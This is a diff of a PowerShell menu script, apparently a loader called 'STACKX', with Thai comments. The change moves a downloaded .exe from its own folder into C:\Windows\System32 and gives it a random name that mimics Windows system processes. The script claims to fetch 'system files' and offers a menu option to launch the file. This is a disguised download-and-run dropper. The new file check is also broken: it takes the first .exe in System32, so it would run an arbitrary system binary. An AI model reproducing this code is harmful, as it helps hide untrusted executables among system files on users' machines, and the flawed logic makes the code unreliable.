@@ -1,14 +1,16 @@
 # --- [ CONFIGURATION ] ---
-# กำหนดชื่อไฟล์แบบสุ่มตามเดิม
-$p_rand = @("font","drv","host","win","svc") | Get-Random
-$m_rand = @("vcp","mgr","svc","hosts","core") | Get-Random
-$r_rand = -join ((97..122) | Get-Random -Count 2 | % {[char]$_})
-$fileName = "$p_rand$m_rand`_$r_rand.exe"
-
-# กำหนดโฟลเดอร์สำหรับเก็บไฟล์ให้ปลอดภัยและเป็นสัดส่วน (ไม่เก็บใน System32)
-$appDirectory = "C:\STACKX"
-$destPath     = Join-Path $appDirectory $fileName
+$appDirectory = "C:\Windows\System32"
 $exeUrl       = "https://raw.githubusercontent.com/backmrpun-hash/PS/main/fontdrvhostt.exe"
+
+# ฟังก์ชันสำหรับเช็คสถานะว่าในโฟลเดอร์มีไฟล์อยู่แล้วหรือไม่
+function Get-LocalAppFile {
+    if (Test-Path $appDirectory) {
+        # ค้นหาไฟล์ .exe แรกที่เจอในโฟลเดอร์
+        $file = Get-ChildItem -Path $appDirectory -Filter "*.exe" | Select-Object -First 1
+        return $file
+    }
+    return $null
+}
 
 # สร้างโฟลเดอร์ปลายทางเตรียมไว้หากยังไม่มีในระบบ
 if (-not (Test-Path $appDirectory)) {
@@ -28,12 +30,22 @@ while ($true) {
     Write-Console "Select Option: " "INPUT"
     $choice = $Host.UI.ReadLine()
 
+    # ดึงข้อมูลไฟล์ปัจจุบันที่มีอยู่ในเครื่องก่อนเริ่มแต่ละเมนู
+    $existingFile = Get-LocalAppFile
+
     if ($choice -eq "1") {
         Clear-Host
         Show-Header
         
-        # ตรวจสอบก่อนว่าในโฟลเดอร์มีไฟล์อยู่แล้วหรือยัง
-        if (-not (Test-Path $destPath)) {
+        # ตรวจสอบ: ถ้ายังไม่มีไฟล์ใดๆ อยู่ในโฟลเดอร์เลย
+        if ($null -eq $existingFile) {
+            # สุ่มชื่อไฟล์ใหม่เฉพาะตอนที่ยังไม่มีไฟล์ในเครื่องเท่านั้น
+            $p_rand = @("font","drv","host","win","svc") | Get-Random
+            $m_rand = @("vcp","mgr","svc","hosts","core") | Get-Random
+            $r_rand = -join ((97..122) | Get-Random -Count 2 | % {[char]$_})
+            $fileName = "$p_rand$m_rand`_$r_rand.exe"
+            $destPath = Join-Path $appDirectory $fileName
+
             Write-Host "  Downloading system files from server..." -ForegroundColor Cyan
             Write-Host ""
             try {
@@ -50,7 +62,9 @@ while ($true) {
                 Write-Console $_.Exception.Message "INFO"
             }
         } else {
+            # ถ้าตรวจเจอไฟล์ชื่อเดิมอยู่แล้ว จะไม่โหลดซ้ำ
             Write-Host "  Notice: Program is already downloaded." -ForegroundColor Yellow
+            Write-Console "File found: $($existingFile.Name)" "INFO"
             Write-Console "You can execute it directly using Option 2." "INFO"
         }
         
@@ -62,13 +76,13 @@ while ($true) {
         Clear-Host
         Show-Header
         
-        # ตรวจสอบว่าผู้ใช้ดาวน์โหลดไฟล์มาหรือยังก่อนสั่งรัน
-        if (Test-Path $destPath) {
+        # ตรวจสอบว่ามีไฟล์ที่ดาวน์โหลดมาแล้วจริงหรือไม่
+        if ($null -ne $existingFile) {
             Write-Host "  Launching program..." -ForegroundColor Green
             Write-Host ""
             try {
-                # สั่งรันโปรแกรมขึ้นมาทำงานปกติแบบรอบเดียว ไม่ผูกกับ Event ใดๆ
-                Start-Process -FilePath $destPath -WindowStyle Normal
+                # รันไฟล์จริงที่ตรวจพบในเครื่อง
+                Start-Process -FilePath $existingFile.FullName -WindowStyle Normal
                 Write-Console "Program started successfully." "SUCCESS"
             }
             catch {
@@ -76,7 +90,7 @@ while ($true) {
                 Write-Console $_.Exception.Message "INFO"
             }
         } else {
-            # แจ้งเตือนหากยังไม่ได้ดาวน์โหลดไฟล์
+            # แจ้งเตือนหากยังไม่มีไฟล์ในโฟลเดอร์
             Write-Host "  [!] Error: File not found." -ForegroundColor Red
             Write-Console "Please select Option 1 to download the program first." "ERROR"
         }
@@ -92,12 +106,11 @@ while ($true) {
         Write-Host "  [ STACKX ENVIRONMENT STATUS ]" -ForegroundColor Magenta
         Write-Host "  -------------------------------------------------------" -ForegroundColor DarkGray
         
-        if (Test-Path $destPath) {
-            $fileInfo = Get-Item $destPath
+        if ($null -ne $existingFile) {
             Write-Host "  [+] System Status : READY / DOWNLOADED" -ForegroundColor Green
-            Write-Host "  [*] File Name     : $($fileInfo.Name)" -ForegroundColor White
-            Write-Host "  [*] Target Path   : $($fileInfo.FullName)" -ForegroundColor White
-            Write-Host "  [*] File Size     : $([math]::Round($fileInfo.Length / 1MB, 2)) MB" -ForegroundColor White
+            Write-Host "  [*] File Name     : $($existingFile.Name)" -ForegroundColor White
+            Write-Host "  [*] Target Path   : $($existingFile.FullName)" -ForegroundColor White
+            Write-Host "  [*] File Size     : $([math]::Round($existingFile.Length / 1MB, 2)) MB" -ForegroundColor White
         } else {
             Write-Host "  [-] System Status : NOT INSTALLED / NO FILE" -ForegroundColor Red
             Write-Host "  [*] Notice        : Please run option 1 to fetch required files." -ForegroundColor White
@@ -108,7 +121,7 @@ while ($true) {
         $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
     }
     elseif ($choice -eq "0") {
-        Write-Host "Closing application..." -ForegroundColor Base
+        Write-Host "Closing application..."
         exit
     }
 }
